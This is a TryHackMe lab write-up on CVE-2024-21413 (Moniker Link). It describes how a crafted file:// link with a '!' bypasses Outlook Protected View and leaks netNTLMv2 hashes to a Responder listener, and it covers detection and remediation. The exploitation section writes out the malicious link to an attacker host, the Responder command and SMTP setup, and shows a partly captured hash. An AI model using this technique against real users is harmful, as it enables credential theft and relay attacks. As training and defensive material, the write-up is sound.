# Moniker Link (CVE-2024-21413) - TryHackMe Writeup

## Executive Summary

In this room, we explored **CVE-2024-21413**, a critical Microsoft Outlook vulnerability known as **Moniker Link**. The vulnerability allows an attacker to bypass Outlook's Protected View mechanism using a specially crafted `file://` hyperlink containing the `!` character. When a victim clicks the malicious link, Outlook initiates an SMB connection to an attacker-controlled host, causing Windows to automatically send NTLM authentication data. This results in the leakage of the victim's **netNTLMv2 hash**, which can then be cracked offline or used in NTLM relay attacks.

---

# Learning Objectives

* Understand how CVE-2024-21413 works
* Learn what Moniker Links are
* Understand Outlook's Protected View
* Capture a victim's netNTLMv2 hash using Responder
* Analyze SMB authentication traffic
* Explore detection and mitigation techniques

---

# Prerequisites

* Basic understanding of networking
* Familiarity with SMB
* Familiarity with Windows authentication
* Basic Python knowledge
* Familiarity with Responder

---

# Concepts Covered

* Microsoft Outlook
* Moniker Links
* Protected View
* SMB Protocol
* NTLM Authentication
* netNTLMv2 Hashes
* Credential Harvesting
* YARA Detection
* Wireshark Analysis

---

# Vulnerability Overview

## CVE Information

| Field            | Value                           |
| ---------------- | ------------------------------- |
| CVE              | CVE-2024-21413                  |
| Name             | Moniker Link                    |
| Published        | February 13, 2024               |
| Severity         | Critical                        |
| CVSS             | 9.8                             |
| Impact           | Credential Leak / Potential RCE |
| Affected Product | Microsoft Outlook               |

---

# What Is a Moniker Link?

Windows supports special URL handlers called **Monikers**.

Examples:

```text
http://
https://
ftp://
file://
skype:
```

Unlike normal web links, Moniker Links can instruct Windows to interact with local resources, applications, network shares, and COM objects.

Example:

```html
<a href="file://server/share">
Click Me
</a>
```

This causes Windows to attempt access to a remote SMB share.

---

# Understanding Protected View

Outlook includes a security feature called **Protected View**.

Purpose:

* Prevent unsafe content execution
* Warn users before opening dangerous resources
* Restrict interaction with untrusted content

Normally, Outlook warns users before opening certain external resources.

Example:

```text
Microsoft Outlook Security Notice

This location may be unsafe.
```

However, CVE-2024-21413 bypasses this protection.

---

# Root Cause

A specially crafted Moniker Link containing the `!` character bypasses Outlook's validation mechanism.

Normal link:

```text
file://ATTACKER/share
```

Malicious link:

```text
file://ATTACKER/share!exploit
```

The additional `!` causes Outlook to incorrectly process the URL and bypass Protected View.

---

# Attack Chain

```text
Attacker
    │
    ▼
Send Malicious Email
    │
    ▼
Victim Opens Email
    │
    ▼
Victim Clicks Link
    │
    ▼
Protected View Bypass
    │
    ▼
Windows SMB Request
    │
    ▼
NTLM Authentication
    │
    ▼
netNTLMv2 Hash Leak
```

---

# Exploitation

## Step 1 - Start Responder

### Purpose

Capture SMB authentication attempts.

### Command

```bash
sudo responder -I ens5
```

### Command Breakdown

| Flag | Description            |
| ---- | ---------------------- |
| -I   | Interface to listen on |
| ens5 | Network interface      |

### Expected Output

```text
[+] Listening for events...
```

---

## Step 2 - Create the Exploit

Create a Python script:

```bash
nano exploit.py
```

Paste the provided PoC.

---

## Step 3 - Modify the Moniker Link

Replace:

```html
file://ATTACKER_MACHINE/test!exploit
```

With:

```html
file://<ATTACKBOX_IP>/test!exploit
```

Example:

```html
file://10.49.73.133/test!exploit
```

---

## Step 4 - Configure SMTP

Replace:

```python
MAILSERVER
```

With:

```python
10.49.184.226
```

Result:

```python
server = smtplib.SMTP('10.49.184.226', 25)
```

---

## Step 5 - Run the Exploit

### Command

```bash
python3 exploit.py
```

### Credentials

```text
attacker
```

### Expected Output

```text
Email delivered
```

---

## Step 6 - Open Outlook

Launch Outlook on the victim machine.

Ignore the sign-in prompt.

Open the inbox.

---

## Step 7 - Trigger the Vulnerability

Open the received email.

Click:

```text
Click me
```

---

## Step 8 - Capture the Hash

Responder receives the authentication attempt:

```text
[SMB] NTLMv2-SSP Client
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
```

Captured hash:

```text
tryhackme::THM-MONIKERLINK:
e2df72a82ae914e5:
CB4DCCAF11404BBAA0CF746E955BD585:
...
```

---

# Why Does This Work?

When the victim clicks:

```text
file://ATTACKBOX_IP/test!exploit
```

Windows attempts:

```text
\\ATTACKBOX_IP\test
```

SMB requires authentication.

Windows automatically sends NTLM challenge-response data.

Responder captures the resulting netNTLMv2 hash.

---

# Wireshark Analysis

The SMB authentication process can be observed in Wireshark.

## Packet Sequence

### Negotiate

```text
Session Setup Request
```

### Challenge

```text
NTLMSSP_CHALLENGE
```

### Authentication

```text
NTLMSSP_AUTH
```

The authentication packet contains:

```text
User name: tryhackme
Domain: THM-MONIKERLINK
```

This confirms successful NTLM authentication.

---

# Detection

## YARA Rule Detection

Researchers created a YARA rule to identify malicious emails containing Moniker Links.

The rule looks for:

```text
file://
```

combined with:

```text
!
```

and suspicious file extensions.

### Detection Logic

```text
Email Headers
      +
file://
      +
! Character
      +
Suspicious File Path
```

### Blue Team Benefit

Detect malicious emails before users interact with them.

---

## Network Detection

Monitor:

```text
TCP 445
```

connections leaving the network.

Outbound SMB traffic to unknown hosts is highly suspicious.

---

## Authentication Monitoring

Look for:

```text
NTLMSSP_AUTH
```

events targeting external systems.

---

# Remediation

## 1. Apply Microsoft Patches

The primary mitigation is installing Microsoft's February 2024 security updates.

Update via:

* Windows Update
* Microsoft Update Catalog

---

## 2. Block Outbound SMB

If operationally possible:

```text
TCP 445
```

should be blocked from accessing the Internet.

---

## 3. Email Filtering

Inspect and block:

```text
file://
```

links and suspicious Moniker Links.

---

## 4. User Awareness

Educate users to:

* Avoid clicking unexpected links
* Verify hyperlinks before opening
* Report suspicious emails

---

# Pentester Notes

## Enumeration Relevance

Limited enumeration value.

Used primarily for credential harvesting.

---

## Exploitation Relevance

High.

Only requires:

* Email delivery
* User interaction

---

## Privilege Escalation Relevance

Indirect.

Captured credentials may lead to elevated access.

---

## Lateral Movement Relevance

High.

Captured hashes may be used for:

* NTLM Relay
* Password Cracking
* Internal Access

---

## Persistence Relevance

Low.

The vulnerability itself does not provide persistence.

---

## Detection Opportunities

* Email analysis
* YARA scanning
* SMB monitoring
* NTLM monitoring
* Outbound firewall logging

---

# Troubleshooting Notes

## Issue

Responder failed to start on port 445.

### Cause

SMB service (`smbd`) was already using the port.

### Detection

```bash
sudo ss -tulpn | grep 445
```

Output:

```text
smbd
```

### Resolution

```bash
sudo systemctl stop smbd
```

Restart Responder.

---

## Issue

No hashes captured.

### Cause

Moniker Link pointed to the mail server instead of the AttackBox.

Incorrect:

```html
file://10.49.184.226/test!exploit
```

Correct:

```html
file://10.49.73.133/test!exploit
```

### Resolution

Update the exploit and resend the email.

---

# Key Takeaways

* Outlook's Protected View can be bypassed through specially crafted Moniker Links.
* The `!` character is central to CVE-2024-21413 exploitation.
* SMB automatically triggers NTLM authentication.
* netNTLMv2 hashes can be captured without malware.
* Credential theft can occur through a simple hyperlink.
* Patching Outlook is the most effective mitigation.

---

# Skills Gained

* Outlook vulnerability analysis
* Moniker Link abuse
* SMB authentication analysis
* NTLM authentication analysis
* Responder usage
* Packet analysis with Wireshark
* Email-based attack simulation
* Detection engineering basics

---

# Future Learning Path

Recommended next topics:

1. NTLM Authentication Internals
2. Responder Deep Dive
3. NTLM Relay Attacks
4. Impacket Toolkit
5. Active Directory Fundamentals
6. Windows Authentication Protocols
7. Pass-the-Hash Attacks
8. Kerberos Authentication

---

# References

* Microsoft Security Response Center
* Check Point Research
* Florian Roth YARA Rules
* TryHackMe: Moniker Link (CVE-2024-21413)

---

# Tags

`CVE-2024-21413`
`Outlook`
`Moniker Link`
`SMB`
`NTLM`
`Responder`
`Wireshark`
`Credential Harvesting`
`Windows`
`TryHackMe`
